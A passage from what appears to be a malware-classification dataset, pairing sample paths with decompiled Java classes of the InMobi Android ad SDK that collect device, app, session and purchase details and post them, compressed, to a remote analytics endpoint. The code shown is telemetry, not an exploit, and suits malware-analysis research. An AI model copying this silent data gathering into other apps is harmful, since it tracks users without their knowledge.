null) {         b.d=new AnalyticsConnectivityReceiver(InternalSDKUtil.getContext(),f);       }       analyticsNetworkManager=b;     }     return analyticsNetworkManager;   }   private void a(  AnalyticsPayload analyticsPayload,  String str){     boolean z;     int i;     BufferedReader bufferedReader;     try {       Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Ping URL: "" + AnalyticsUtils.getEventUrl());       String completePayload=analyticsPayload.getCompletePayload();       int minEventsToCompress=AnalyticsInitializer.getConfigParams().getMinEventsToCompress();       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Post body: "" + completePayload);       if (analyticsPayload.getPayloadSize() < minEventsToCompress || Build.VERSION.SDK_INT < 8) {         z=false;       }  else {         Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Compressing the payload"");         z=true;         completePayload=AnalyticsUtils.compressPayload(completePayload);       }       int maxAppIdLength=AnalyticsInitializer.getConfigParams().getMaxAppIdLength();       if (str.length() > maxAppIdLength) {         str=str.substring(0,maxAppIdLength);       }       String a2=a(completePayload,str,z);       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Post body: "" + a2);       AnalyticsCommon analyticsCommon=new AnalyticsCommon();       HttpURLConnection httpURLConnection=analyticsCommon.setupConnection(AnalyticsUtils.getEventUrl());       analyticsCommon.postData(httpURLConnection,a2);       try {         i=httpURLConnection.getResponseCode();       }  catch (      IOException e) {         i=401;       }       Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Http Status Code: "" + i);       if (i == 200) {         this.e=0;         AnalyticsDatabaseManager.getInstance().deleteEvents(analyticsPayload.getTableIdList());       }  else {         this.e++;         if (this.e >= AnalyticsUtils.getMaxRetryBeforeDiscard()) {           this.e=0;           AnalyticsDatabaseManager.getInstance().deleteEvents(analyticsPayload.getTableIdList());         }       }       try {         bufferedReader=new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream(),""UTF-8""));       }  catch (      Exception e2) {         try {           bufferedReader=new BufferedReader(new InputStreamReader(httpURLConnection.getErrorStream(),""UTF-8""));         }  catch (        Exception e3) {           bufferedReader=null;         }       }       try {         StringBuilder sb=new StringBuilder();         while (true) {           String readLine=bufferedReader.readLine();           if (readLine != null) {             sb.append(readLine).append(""\n"");           }  else {             Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Ping Response: "" + sb.toString());             httpURLConnection.disconnect();             analyticsCommon.closeResource(bufferedReader);             return;           }         }       }  catch (      Exception e4) {         Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Unable to read from stream"");       }     }  catch (    Exception e5) {       Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Exception Pinging"",e5);       this.e++;       if (this.e >= AnalyticsUtils.getMaxRetryBeforeDiscard()) {         this.e=0;         AnalyticsDatabaseManager.getInstance().deleteEvents(analyticsPayload.getTableIdList());       }     }   }   private String a(  String str,  String str2,  boolean z){     StringBuilder sb=new StringBuilder();     String num=Integer.toString(new Random().nextInt());     HashMap hashMap=null;     Long lTVId=AnalyticsInitializer.getConfigParams().getLTVId();     if (str != null) {       sb.append(""payload="");       sb.append(AnalyticsCommon.getURLEncoded(str));     }     if (str2 != null) {       sb.append(""&app_id="");       sb.append(str2);     }     sb.append(""&c="");     if (z) {       sb.append(1);     }  else {       sb.append(0);     }     if (lTVId != null) {       hashMap=new HashMap();       hashMap.put(""LTVID"",lTVId + """");     }     String uidMap=AnalyticsInitializer.getConfigParams().getUID().getUidMap(1,num,hashMap);     sb.append(""&u-id-map="");     sb.append(AnalyticsCommon.getURLEncoded(uidMap));     sb.append(""&u-id-key="");     sb.append(num);     sb.append(""&u-key-ver="");     sb.append(UIDHelper.getRSAKeyVersion());     String str3=""pr-SAND-"" + InternalSDKUtil.getInMobiInternalVersion(""4.1.1"") + ""-""+ InternalSDKUtil.INMOBI_SDK_RELEASE_DATE;     sb.append(""&mk-version="");     sb.append(str3);     return sb.toString();   } class a extends Thread {     a(){     } class C0021a implements Handler.Callback {       C0021a(){       }       @Override public boolean handleMessage(      Message message){         Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""NetworkManager->handleMessag: msg:"" + message);         if (message.what == 1001) {           if (AnalyticsInitializer.getConfigParams().getAutomaticCapture().getAutoSessionCapture() || AnalyticsEventsWrapper.isEventsUser()) {             AnalyticsNetworkManager.this.b();           }  else {             AnalyticsUtils.setStartHandle(false);           }         }         return true;       }     }     @Override public void run(){       Looper.prepare();       Handler unused=AnalyticsNetworkManager.a=new Handler(new C0021a());       Looper.loop();     }   }   public void b(){     boolean z=true;     if (this.d != null && this.d.isConnected() && this.c != null) {       AnalyticsPayload payloadList=this.c.getPayloadList(AnalyticsDatabaseManager.getInstance().getEvents(),InternalSDKUtil.getContext());       if (payloadList.getCompletePayload() != null) {         a(payloadList,SessionInfo.getAppId(InternalSDKUtil.getContext()));         z=false;       }     }     if (!z) {       a.sendEmptyMessageDelayed(1001,AnalyticsUtils.getTimeinterval());     }  else {       AnalyticsUtils.setStartHandle(false);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.net\AnalyticsPayload.code","public class AnalyticsPayload {   private String a;   private List<Long> b;   private String c;   private int d;   public int getPayloadSize(){     return this.d;   }   public void setPayloadSize(  int i){     this.d=i;   }   public AnalyticsPayload(  String str,  List<Long> list){     this.a=str;     this.b=list;   }   public String getOnlyEvent(){     return this.a;   }   public List<Long> getTableIdList(){     return this.b;   }   public String getCompletePayload(){     return this.c;   }   public void setCompletePayload(  String str){     this.c=str;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.net\AnalyticsPayloadBuilder.code","public class AnalyticsPayloadBuilder {   public AnalyticsPayload getPayloadList(  List<AnalyticsEvent> list,  Context context){     int i;     Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""PayloadBuilder->getPayloadList:"");     JSONArray jSONArray=new JSONArray();     ArrayList arrayList=new ArrayList();     ArrayList arrayList2=new ArrayList();     for (int i2=0; i2 < list.size(); i2=i) {       arrayList.clear();       AnalyticsEvent analyticsEvent=list.get(i2);       String eventSessionId=analyticsEvent.getEventSessionId();       i=i2;       while (i < list.size() && eventSessionId.equals(list.get(i).getEventSessionId())) {         arrayList2.add(Long.valueOf(list.get(i).getEventTableId()));         arrayList.add(list.get(i));         i++;       }       jSONArray.put(a(a(eventSessionId,analyticsEvent.getEventSessionTimeStamp(),context),a(arrayList)));     }     AnalyticsPayload analyticsPayload=new AnalyticsPayload(null,arrayList2);     if (jSONArray.length() != 0) {       analyticsPayload.setCompletePayload(jSONArray.toString());       analyticsPayload.setPayloadSize(list.size());     }     return analyticsPayload;   }   private JSONObject a(  JSONObject jSONObject,  JSONArray jSONArray){     JSONObject jSONObject2=new JSONObject();     try {       jSONObject2.put(""session"",jSONObject);     }  catch (    JSONException e) {       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Session addition to payload failed"");     }     try {       jSONObject2.put(""events"",jSONArray);     }  catch (    JSONException e2) {       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Events addition to payload failed"");     }     return jSONObject2;   }   private JSONObject a(  String str,  long j,  Context context){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""ft"",SessionInfo.getFirstTime());       jSONObject.put(""a"",context.getPackageName());       jSONObject.put(""an"",AnalyticsUtils.getApplicationName(context));       jSONObject.put(""av"",AnalyticsUtils.getAppVersion(context));       jSONObject.put(""p"",Values.ANDROID_PLATFORM_NAME);       jSONObject.put(""pv"",Build.VERSION.RELEASE);       jSONObject.put(""ca"",InternalSDKUtil.getConnectivityType(context));       jSONObject.put(""ma"",Build.MANUFACTURER);       jSONObject.put(""mo"",Build.MODEL);       jSONObject.put(AnalyticsEvent.TYPE_START_SESSION,str);       jSONObject.put(""sts"",j);       jSONObject.put(""sv"",""4.1.1"");       jSONObject.put(""co"",AnalyticsUtils.getCountryISO(context));     }  catch (    JSONException e) {       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Creation of session object failed"",e);     }     return jSONObject;   }   private JSONArray a(  List<AnalyticsEvent> list){     JSONArray jSONArray=new JSONArray();     for (    AnalyticsEvent analyticsEvent : list) {       JSONObject jSONObject=new JSONObject();       try {         String fromBase10=Base62.fromBase10(analyticsEvent.getEventId());         if (fromBase10 != null) {           jSONObject.put(""eid"",fromBase10);         }         jSONObject.put(""t"",analyticsEvent.getEventType());         jSONObject.put(AnalyticsSQLiteHelper.EVENT_LIST_TS,analyticsEvent.getEventTimeStamp());         jSONObject.put(""ld"",analyticsEvent.getEventLevelId());         jSONObject.put(""ls"",analyticsEvent.getEventLevelStatus());         jSONObject.put(""ln"",analyticsEvent.getEventLevelName());         if (analyticsEvent.getEventAttributeMap() != null) {           try {             jSONObject.put(AnalyticsSQLiteHelper.EVENT_LIST_AM,new JSONObject(analyticsEvent.getEventAttributeMap()));           }  catch (          Exception e) {             Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Events attribute map is incorrect. Not sending custom event map."");           }         }         jSONObject.put(""tt"",analyticsEvent.getEventTimeTaken());         if (analyticsEvent.getEventAttemptCount() != null) {           jSONObject.put(""ac"",1);         }         jSONObject.put(""at"",analyticsEvent.getEventAttemptTime());         jSONObject.put(Values.LANGUAGE,analyticsEvent.getEventCustomName());         if (AnalyticsEvent.TYPE_TAG_TRANSACTION.equals(analyticsEvent.getEventType())) {           jSONObject.put(""in"",analyticsEvent.getTransactionItemName());           int transactionItemCount=analyticsEvent.getTransactionItemCount();           if (transactionItemCount > 0) {             jSONObject.put(""n"",transactionItemCount);           }           jSONObject.put(AnalyticsEvent.EVENT_ID,analyticsEvent.getTransactionItemDescription());           jSONObject.put(""ip"",analyticsEvent.getTransactionItemPrice());           jSONObject.put(""c"",analyticsEvent.getTransactionCurrencyCode());           jSONObject.put(AnalyticsEvent.TYPE_TAG_TRANSACTION,analyticsEvent.getTransactionProductId());           jSONObject.put(""ti"",analyticsEvent.getTransactionId());           int transactionItemType=analyticsEvent.getTransactionItemType();           if (AnalyticsEvent.TRANSACTION_ITEM_TYPE.INVALID.getValue() != transactionItemType) {             jSONObject.put(""it"",transactionItemType);           }           int transactionStatus=analyticsEvent.getTransactionStatus();           if (AnalyticsEvent.TRANSACTION_STATUS_SERVER_CODE.INVALID.getValue() != transactionStatus) {             jSONObject.put(""tp"",transactionStatus);           }         }       }  catch (      Exception e2) {         Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Creation of events json object failed"",e2);       }       jSONArray.put(jSONObject);     }     return jSONArray;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.net\C0021a.code","class C0021a implements Handler.Callback {   C0021a(){   }   @Override public boolean handleMessage(  Message message){     Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""NetworkManager->handleMessag: msg:"" + message);     if (message.what == 1001) {       if (AnalyticsInitializer.getConfigParams().getAutomaticCapture().getAutoSessionCapture() || AnalyticsEventsWrapper.isEventsUser()) {         AnalyticsNetworkManager.this.b();       }  else {         AnalyticsUtils.setStartHandle(false);       }     }     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.net\HttpRequestCallback.code","public interface HttpRequestCallback {   public static final int HTTP_FAILURE=1;   public static final int HTTP_SUCCESS=0;   void notifyResult(  int i,  Object obj); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.util\AnalyticsUtils.code","public class AnalyticsUtils {   public static final String ANALYTICS_LOGGING_TAG=""[InMobi]-[Analytics]-4.1.1"";   public static final String INITIALIZE_NOT_CALLED=""Please call InMobi.initialize or startSession before calling any events API"";   private static String a;   private static boolean b;   public static String getWebviewUserAgent(){     return a;   }   public static void setWebviewUserAgent(  String str){     a=str;   }   public static synchronized void setStartHandle(  boolean z){ synchronized (AnalyticsUtils.class) {       b=z;     }   }   public static synchronized boolean getStartHandle(){     boolean z; synchronized (AnalyticsUtils.class) {       z=b;     }     return z;   }   public static synchronized long getMaxdbcount(){     long maxDbEvents; synchronized (AnalyticsUtils.class) {       maxDbEvents=AnalyticsInitializer.getConfigParams().getMaxDbEvents();     }     return maxDbEvents;   }   public static synchronized String getMaxevents(){     String str; synchronized (AnalyticsUtils.class) {       str=AnalyticsInitializer.getConfigParams().getGetParamsLimit() + """";     }     return str;   }   public static synchronized int getMaxstring(){     int maxValLength; synchronized (AnalyticsUtils.class) {       maxValLength=AnalyticsInitializer.getConfigParams().getMaxValLength();     }     return maxValLength;   }   public static synchronized int getMaxparamskey(){     int maxKeyLength; synchronized (AnalyticsUtils.class) {       maxKeyLength=AnalyticsInitializer.getConfigParams().getMaxKeyLength();     }     return maxKeyLength;   }   public static synchronized int getExtraParamsLimit(){     int extraParamsLimit; synchronized (AnalyticsUtils.class) {       extraParamsLimit=AnalyticsInitializer.getConfigParams().getExtraParamsLimit();     }     return extraParamsLimit;   }   public static synchronized long getTimeinterval(){     long pingInterval; synchronized (AnalyticsUtils.class) {       pingInterval=AnalyticsInitializer.getConfigParams().getPingInterval();     }     return pingInterval;   }   public static synchronized int getMaxRetryBeforeDiscard(){     int maxRetryBeforeCacheDiscard; synchronized (AnalyticsUtils.class) {       maxRetryBeforeCacheDiscard=AnalyticsInitializer.getConfigParams().getMaxRetryBeforeCacheDiscard();     }     return maxRetryBeforeCacheDiscard;   }   public static String getApplicationName(  Context context){     try {       PackageManager packageManager=context.getPackageManager();       return (String)packageManager.getApplicationLabel(packageManager.getApplicationInfo(context.getPackageName(),0));     }  catch (    Exception e) {       Log.internal(ANALYTICS_LOGGING_TAG,""Error retrieving application name"");       return null;     }   }   public static String getAppVersion(  Context context){     try {       return context.getPackageManager().getPackageInfo(context.getPackageName(),0).versionName;     }  catch (    Exception e) {       Log.internal(ANALYTICS_LOGGING_TAG,""Error retrieving application version"");       return null;     }   }   public static Object getCountryISO(  Context context){     TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone"");     return telephonyManager.getNetworkCountryIso().equals("""") ? context.getResources().getConfiguration().locale.getISO3Country() : telephonyManager.getNetworkCountryIso();   }   public static String convertToJSON(  Map<String,String> map){     String str;     JSONObject jSONObject;     if (map.size() > getExtraParamsLimit()) {       Log.verbose(ANALYTICS_LOGGING_TAG,""Analytics events - number of key-value pairs in attribute map exceeds "" + getExtraParamsLimit());       return null;     }     try {       jSONObject=new JSONObject();       for (      String str2 : map.keySet()) {         if (str2.length() > 0 && str2.length() <= getMaxparamskey()) {           String str3=map.get(str2);           if (str3.length() <= getMaxstring()) {             jSONObject.put(str2,map.get(str2));           }  else {             Log.verbose(ANALYTICS_LOGGING_TAG,""Analytics events - value : "" + str3 + "" ,exceeds inmobi's limitation of ""+ getMaxstring()+ "" characters."");             return null;           }         }  else {           Log.verbose(ANALYTICS_LOGGING_TAG,""Analytics events - key : "" + str2 + "" ,exceeds inmobi's limitation of ""+ getMaxparamskey()+ "" characters."");           return null;         }       }     }  catch (    Exception e) {       Log.internal(ANALYTICS_LOGGING_TAG,""Unable to convert map to JSON"");     }     if (jSONObject.length() > 0) {       str=jSONObject.toString();       return str;     }     str=null;     return str;   }   public static String convertLevelStatus(  AnalyticsEventsWrapper.IMSectionStatus iMSectionStatus){     if (iMSectionStatus == AnalyticsEventsWrapper.IMSectionStatus.COMPLETED) {       return ""1"";     }     if (iMSectionStatus == AnalyticsEventsWrapper.IMSectionStatus.FAILED) {       return ""2"";     }     if (iMSectionStatus != AnalyticsEventsWrapper.IMSectionStatus.CANCELED) {       return null;     }     return ""3"";   }   public static String convertItemType(  AnalyticsEventsWrapper.IMItemType iMItemType){     if (iMItemType == AnalyticsEventsWrapper.IMItemType.CONSUMABLE) {       return ""1"";     }     if (iMItemType == AnalyticsEventsWrapper.IMItemType.DURABLE) {       return ""2"";     }     if (iMItemType != AnalyticsEventsWrapper.IMItemType.PERSONALIZATION) {       return null;     }     return ""3"";   }   public static String getScreenWidth(  Context context){     return """" + context.getResources().getDisplayMetrics().widthPixels;   }   public static String getScreenHeight(  Context context){     return """" + context.getResources().getDisplayMetrics().heightPixels;   }   public static float getDeviceDensity(  Context context){     return context.getResources().getDisplayMetrics().density;   }   public static void asyncPingInternal(  String str){     HttpURLConnection httpURLConnection;     HttpURLConnection httpURLConnection2=null;     try {       try {         String replaceAll=str.replaceAll(""%25"",""%"");         Log.debug(ANALYTICS_LOGGING_TAG,""Pinging URL: "" + replaceAll);         httpURLConnection=(HttpURLConnection)new URL(replaceAll).openConnection();       }  catch (      Exception e) {         e=e;       }     }  catch (    Throwable th) {       th=th;     }     try {       httpURLConnection.setConnectTimeout(20000);       httpURLConnection.setRequestMethod(""GET"");       InternalSDKUtil.addCommonPropertiesToConnection(httpURLConnection);       Log.debug(ANALYTICS_LOGGING_TAG,""Async Ping Connection Response Code: "" + httpURLConnection.getResponseCode());       if (httpURLConnection != null) {         httpURLConnection.disconnect();       }     }  catch (    Exception e2) {       httpURLConnection2=httpURLConnection;       e=e2;       Log.debug(ANALYTICS_LOGGING_TAG,""Error doing async Ping. "",e);       if (httpURLConnection2 != null) {         httpURLConnection2.disconnect();       }     } catch (    Throwable th2) {       httpURLConnection2=httpURLConnection;       th=th2;       if (httpURLConnection2 != null) {         httpURLConnection2.disconnect();       }       throw th;     }   }   public static String getEventUrl(){     return AnalyticsInitializer.getConfigParams().getEndPoints().getEventsUrl();   }   public static String compressPayload(  String str){     try {       ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();       Base64OutputStream base64OutputStream=new Base64OutputStream(byteArrayOutputStream,0);       GZIPOutputStream gZIPOutputStream=new GZIPOutputStream(base64OutputStream);       gZIPOutputStream.write(str.getBytes(""UTF-8""));       gZIPOutputStream.close();       base64OutputStream.close();       return byteArrayOutputStream.toString();     }  catch (    Exception e) {       Log.internal(ANALYTICS_LOGGING_TAG,""Exception compress sdk payload."",e);       return null;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.util\SessionInfo.code","public class SessionInfo {   private static String a;   private static long b;   private static String c;   private static int d;   public static synchronized boolean isUpdatedFromOldSDK(  Context context){     boolean z; synchronized (SessionInfo.class) {       z=context.getSharedPreferences(""inmobiAppAnalyticsSession"",0).getBoolean(""UPDATED_FROM_OLD_SDK"",false);     }     return z;   }   public static synchronized void updatedFromOldSDK(  Context context){ synchronized (SessionInfo.class) {       SharedPreferences.Editor edit=context.getSharedPreferences(""inmobiAppAnalyticsSession"",0).edit();       edit.putBoolean(""UPDATED_FROM_OLD_SDK"",true);       edit.commit();     }   }   public static synchronized void resetFirstTime(){ synchronized (SessionInfo.class) {       d=0;     }   }   public static synchronized int getFirstTime(){     int i; synchronized (SessionInfo.class) {       i=d;     }     return i;   }   public static synchronized void storeFirstTime(  Context context){     long timeInMillis;     int i; synchronized (SessionInfo.class) {       SharedPreferences sharedPreferences=context.getSharedPreferences(""inmobiAppAnalyticsSession"",0);       SharedPreferences.Editor edit=sharedPreferences.edit();       long j=sharedPreferences.getLong(""SESSION_TIMEM"",-1L);       if (j != -1) {         GregorianCalendar gregorianCalendar=new GregorianCalendar();         gregorianCalendar.setTimeInMillis(j);         gregorianCalendar.setFirstDayOfWeek(2);         GregorianCalendar gregorianCalendar2=new GregorianCalendar();         long timeInMillis2=gregorianCalendar2.getTimeInMillis();         gregorianCalendar2.setFirstDayOfWeek(2);         int i2=gregorianCalendar.get(6) != gregorianCalendar2.get(6) ? 1 : 0;         if (gregorianCalendar.get(3) != gregorianCalendar2.get(3)) {           i2|=2;         }         if (gregorianCalendar.get(2) != gregorianCalendar2.get(2)) {           i2|=4;         }         i=i2;         timeInMillis=timeInMillis2;       }  else {         timeInMillis=new GregorianCalendar().getTimeInMillis();         i=15;       }       edit.putLong(""SESSION_TIMEM"",timeInMillis);       edit.commit();       d=i;     }   }   public static synchronized void storeSessionId(  Context context){ synchronized (SessionInfo.class) {       a=UUID.randomUUID().toString();       b=System.currentTimeMillis() / 1000;       SharedPreferences.Editor edit=context.getSharedPreferences(""inmobiAppAnalyticsSession"",0).edit();       edit.putString(""SESSION_ID"",a);       edit.putLong(""SESSION_TIME"",b);       edit.commit();     }   }   public static synchronized String getSessionId(  Context context){     String string; synchronized (SessionInfo.class) {       if (a != null) {         string=a;       }  else {         string=context.getSharedPreferences(""inmobiAppAnalyticsSession"",0).getString(""SESSION_ID"",null);         a=string;       }     }     return string;   }   public static synchronized long getSessionTime(  Context context){     long j; synchronized (SessionInfo.class) {       if (b != 0) {         j=b;       }  else {         j=context.getSharedPreferences(""inmobiAppAnalyticsSession"",0).getLong(""SESSION_TIME"",0L);         b=j;       }     }     return j;   }   public static synchronized void removeSessionId(  Context context){ synchronized (SessionInfo.class) {       a=null;       b=0L;       SharedPreferences.Editor edit=context.getSharedPreferences(""inmobiAppAnalyticsSession"",0).edit();       edit.putString(""SESSION_ID"",null);       edit.putString(""SESSION_TIME"",null);       edit.commit();     }   }   public static void storeAppId(  Context context,  String str){     c=str;     SharedPreferences.Editor edit=context.getSharedPreferences(""inmobiAppAnalyticsAppId"",0).edit();     edit.putString(""APP_ID"",str);     edit.commit();   }   public static String getAppId(  Context context){     if (c != null) {       return c;     }     String string=context.getSharedPreferences(""inmobiAppAnalyticsAppId"",0).getString(""APP_ID"",null);     c=string;     return string;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.cache\a.code","public static class a implements Validator {   a(){   }   @Override public boolean validate(  Map<String,Object> map){     return CacheController.b(map);   } } public static class a implements Runnable {   a(){   }   @Override public void run(){     LocalCache.c();   } } public class a implements RetryMechanism.RetryRunnable {   a(){   }   @Override public void run() throws Exception {     try {       if (InternalSDKUtil.checkNetworkAvailibility(InternalSDKUtil.getContext())) {         ProductCacheConfig.this.a();         return;       }       throw new IOException(""Network unavailable"");     }  catch (    Exception e) {       throw e;     }   }   @Override public void completed(){     ProductCacheConfig.this.b.set(false);   } } public class a extends TimerTask {   final RetryRunnable a;   a(  RetryRunnable retryRunnable){     this.a=retryRunnable;   }   @Override public void run(){     try {       this.a.run();       this.a.completed();     }  catch (    Exception e) {       RetryMechanism.a(RetryMechanism.this);       if (RetryMechanism.this.b > RetryMechanism.this.c) {         Log.internal(InternalSDKUtil.LOGGING_TAG,""Exception occured while running retry mechanism and will the limit for retrying has been reached."");         this.a.completed();       }  else {         Log.internal(InternalSDKUtil.LOGGING_TAG,""Exception occured while running retry mechanism and will retry in "" + (RetryMechanism.this.b * RetryMechanism.this.d) + "" ms"");         RetryMechanism.this.a(this.a,RetryMechanism.this.b * RetryMechanism.this.d);       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.cache\b.code","public static class b implements Committer {   b(){   }   @Override public void onCommit(){     CacheController.f();   } } public class b {   private String b;   private long c;   private b(){   }   b(  ProductCacheConfig productCacheConfig,  a aVar){     this();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.cache\c.code","public static class c implements Committer {   final String a;   c(  String str){     this.a=str;   }   @Override public void onCommit(){     try {       ProductCacheConfig productCacheConfig=(ProductCacheConfig)CacheController.a.get(this.a);       if (productCacheConfig != null) {         LocalCache.addToCache(this.a,productCacheConfig.toJSON());       }     }  catch (    JSONException e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Unable to add json to persistent memory"",e);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.cache\CacheController.code","public final class CacheController {   private static Map<String,ProductCacheConfig> a=new HashMap();   private static ProductCacheConfig b=null;   private static boolean c=true;   private static Map<String,Validator> d=new HashMap();   private static Map<String,Map<String,String>> e=new HashMap(); public interface Committer {     void onCommit();   } public interface Validator {     boolean validate(    Map<String,Object> map);   }   private CacheController(){   }   public static ProductConfig getConfig(  String str,  Context context,  Map<String,String> map,  Validator validator) throws CommonsException {     if (validator != null) { synchronized (d) {         d.put(str,validator);       }     }     if (map != null) { synchronized (e) {         e.put(str,map);       }     }     if (c) {       if (InternalSDKUtil.getContext() == null) {         if (context == null) {           throw new CommonsException(1);         }         InternalSDKUtil.setContext(context);       }       c=false;       e();       d();     }     b.getData((Validator)null);     ProductCacheConfig productCacheConfig=a.get(str);     if (productCacheConfig == null) {       throw new CommonsException(2);     }     productCacheConfig.getData(map,validator);     return productCacheConfig;   } public static class d extends BroadcastReceiver {     d(){     }     @Override public void onReceive(    Context context,    Intent intent){       CacheController.a();     }   }   private static void d(){     InternalSDKUtil.getContext().registerReceiver(new d(),new IntentFilter(""android.net.conn.CONNECTIVITY_CHANGE""));   }   static void a(){     Map<String,String> map; synchronized (d) {       for (      String str : d.keySet()) {         try {           if (InternalSDKUtil.checkNetworkAvailibility(InternalSDKUtil.getContext())) { synchronized (e) {               map=e.get(str);             }             getConfig(str,null,map,d.get(str));           }  else {             continue;           }         }  catch (        CommonsException e2) {           Log.internal(InternalSDKUtil.LOGGING_TAG,""Unable to reinitialize product "" + str);         }       }     }     if (b != null) {       b.getData((Validator)null);     }   }   private static void e(){     Log.verbose(InternalSDKUtil.LOGGING_TAG,""Bootstrapping cache."");     LocalCache.initRoot();     Iterator<String> keys=LocalCache.getRoot().keys();     while (keys.hasNext()) {       String next=keys.next();       try {         Object obj=LocalCache.getRoot().get(next);         if (obj instanceof JSONObject) {           ProductCacheConfig productCacheConfig=new ProductCacheConfig((JSONObject)obj,new c(next));           ProductCacheConfig productCacheConfig2=a.get(next);           if (productCacheConfig2 != null) {             productCacheConfig.setValidator(productCacheConfig2.getValidator());             productCacheConfig.setMap(productCacheConfig2.getMap());           }           a.put(next,productCacheConfig);         }       }  catch (      JSONException e2) {         Log.internal(InternalSDKUtil.LOGGING_TAG,""Unable to dump config from persistent memory to products in memory"",e2);       }     }     if (b == null) {       b=new ProductCacheConfig(LocalCache.getRoot(),new b());       b.getData(UIDUtil.getMap(InternalSDKUtil.getContext(),null),new a());     }  else {       b.loadFromJSON(LocalCache.getRoot());     }     InternalSDKUtil.initialize(InternalSDKUtil.getContext());   } public static class c implements Committer {     final String a;     c(    String str){       this.a=str;     }     @Override public void onCommit(){       try {         ProductCacheConfig productCacheConfig=(ProductCacheConfig)CacheController.a.get(this.a);         if (productCacheConfig != null) {           LocalCache.addToCache(this.a,productCacheConfig.toJSON());         }       }  catch (      JSONException e) {         Log.internal(InternalSDKUtil.LOGGING_TAG,""Unable to add json to persistent memory"",e);       }     }   } public static class b implements Committer {     b(){     }     @Override public void onCommit(){       CacheController.f();     }   } public static class a implements Validator {     a(){     }     @Override public boolean validate(    Map<String,Object> map){       return CacheController.b(map);     }   }   public static void f(){     ProductCacheConfig productCacheConfig;     try {       JSONObject jSONObject=new JSONObject(b.getRawData());       JSONObject populateToNewJSON=InternalSDKUtil.populateToNewJSON(jSONObject.getJSONObject(""AND""),jSONObject.getJSONObject(""common""),true);       try {         populateToNewJSON.put(""timestamp"",(int)(System.currentTimeMillis() / 1000));       }  catch (      JSONException e2) {         Log.internal(InternalSDKUtil.LOGGING_TAG,""Unable to add timestamp to JSON"");       }       Iterator<String> keys=populateToNewJSON.keys();       while (keys.hasNext()) {         String next=keys.next();         try {           try {             Object obj=LocalCache.getRoot().get(next);             if ((obj instanceof JSONObject) && (productCacheConfig=a.get(next)) != null) {               ((JSONObject)obj).put(""timestamp"",0);               ((JSONObject)obj).put(""data"",productCacheConfig.getRawData());             }           }  catch (          JSONException e3) {           }         }  catch (        Exception e4) {           Log.debug(InternalSDKUtil.LOGGING_TAG,""Error while merging data -> "" + e4.getMessage());         }       }       LocalCache.saveRoot(populateToNewJSON);       e();       a();     }  catch (    JSONException e5) {     }   }   public static boolean b(  Map<String,Object> map){     try {       Map<String,Object> populateToNewMap=InternalSDKUtil.populateToNewMap((Map)map.get(""AND""),(Map)map.get(""common""),true);       c(populateToNewMap);       Iterator<String> it=populateToNewMap.keySet().iterator();       while (it.hasNext()) {         Object obj=populateToNewMap.get(it.next());         if (obj instanceof Map) {           c((Map)obj);         }       }       return true;     }  catch (    Exception e2) {       return false;     }   }   private static void c(  Map<String,Object> map){     InternalSDKUtil.getIntFromMap(map,""expiry"",1,2147483647L);     InternalSDKUtil.getIntFromMap(map,""maxRetry"",0,2147483647L);     InternalSDKUtil.getIntFromMap(map,""retryInterval"",1,2147483647L);     InternalSDKUtil.getStringFromMap(map,""url"");     InternalSDKUtil.getStringFromMap(map,""protocol"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.cache\Committer.code","public interface Committer {   void onCommit(); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.cache\d.code","public static class d extends BroadcastReceiver {   d(){   }   @Override public void onReceive(  Context context,  Intent intent){     CacheController.a();   } } "
